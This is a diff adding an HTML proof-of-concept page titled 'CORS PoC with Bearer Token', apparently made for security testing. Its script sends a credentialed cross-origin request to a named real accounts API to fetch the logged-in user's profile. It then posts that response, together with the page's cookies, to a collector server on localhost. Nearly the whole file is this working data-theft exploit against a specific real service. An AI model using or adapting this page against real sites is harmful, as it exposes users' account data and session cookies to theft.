@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS PoC with Bearer Token</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+        }
+        h1 {
+            color: #333;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <h1>CORS PoC with Bearer Token</h1>
+    <button id="makeRequest">Make Request</button>
+
+    <script>
+        document.getElementById('makeRequest').addEventListener('click', function() {
+            const xhr = new XMLHttpRequest();
+            
+            // Open a request to the external API with credentials
+            xhr.open('GET', 'https://accounts-api-dev.mheducation.com/api/v1/users/self', true);
+            xhr.withCredentials = true;  // Include cookies with the request
+            
+            xhr.onload = function() {
+                if (xhr.status >= 200 && xhr.status < 300) {
+                    // Send the response data and any cookies received to your local server
+                    fetch('http://localhost:3000/receive-data', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            data: xhr.responseText,       // API response
+                            cookies: document.cookie      // Local cookies
+                        })
+                    })
+                    .then(response => response.json())
+                    .then(data => console.log('Data sent to server:', data))
+                    .catch(error => console.error('Error sending data to server:', error));
+                } else {
+                    console.error(`Error: ${xhr.status}`);
+                }
+            };
+
+            xhr.onerror = function() {
+                console.error('Request failed');
+            };
+
+            xhr.send();  // Send the request
+        });
+    </script>
+</body>
+</html>
